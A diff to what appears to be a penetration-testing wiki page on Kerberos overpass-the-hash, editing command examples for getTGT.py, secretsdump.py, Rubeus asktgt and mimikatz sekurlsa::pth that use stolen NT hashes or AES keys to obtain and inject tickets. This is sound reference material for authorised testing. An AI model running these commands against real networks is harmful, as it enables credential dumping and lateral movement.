@@ -34,10 +34,9 @@ getTGT.py -aesKey 'KerberosKey' $DOMAIN/$USER@$TARGET
 
 Once a TGT is obtained, the tester can use it with the environment variable `KRB5CCNAME` with tools implementing [pass-the-ticket](ptt.md).
 
-An alternative to requesting the TGT and then passing the ticket is using the `-k` option in Impacket scripts. Using that option allows for passing either TGTs or STs. Example below with secretsdump.
 
 ```bash
-secretsdump.py -k -hashes 'LMhash:NThash' $DOMAIN/$USER@$TARGET
+KRB5CCNAME=/path/to/ticket.ccache secretsdump.py -k -no-pass @"$TARGET"
 ```
 
 
@@ -50,10 +49,10 @@ On Windows, requesting a TGT can be achieved with [Rubeus](https://github.com/Gh
 Rubeus.exe asktgt /domain:$DOMAIN /user:$USER /rc4:$NThash /ptt
 
 # with an AES 128 key
-Rubeus.exe asktgt /domain:$DOMAIN /user:$USER /aes128:$aes128_key /ptt
+Rubeus.exe asktgt /domain:$DOMAIN /user:$USER /aes128:$AES_128_KEY /ptt
 
 # with an AES 256 key
-Rubeus.exe asktgt /domain:$DOMAIN /user:$USER /aes256:$aes256_key /ptt
+Rubeus.exe asktgt /domain:$DOMAIN /user:$USER /aes256:$AES_256_KEY /ptt
 ```
 
 An alternative to Rubeus is [mimikatz](https://github.com/gentilkiwi/mimikatz) with [`sekurlsa::pth`](https://tools.thehacker.recipes/mimikatz/modules/sekurlsa/pth).
@@ -63,10 +62,10 @@ An alternative to Rubeus is [mimikatz](https://github.com/gentilkiwi/mimikatz) w
 sekurlsa::pth /user:$USER /domain:$DOMAIN /rc4:$NThash /ptt
 
 # with an AES 128 key
-sekurlsa::pth /user:$USER /domain:$DOMAIN /aes128:$aes128_key /ptt
+sekurlsa::pth /user:$USER /domain:$DOMAIN /aes128:$AES_128_KEY /ptt
 
 # with an AES 256 key
-sekurlsa::pth /user:$USER /domain:$DOMAIN /aes256:$aes256_key /ptt
+sekurlsa::pth /user:$USER /domain:$DOMAIN /aes256:$AES_256_KEY /ptt
 ```
 
 For both mimikatz and Rubeus, the `/ptt` flag is used to automatically [inject the ticket](ptt.md#injecting-the-ticket).
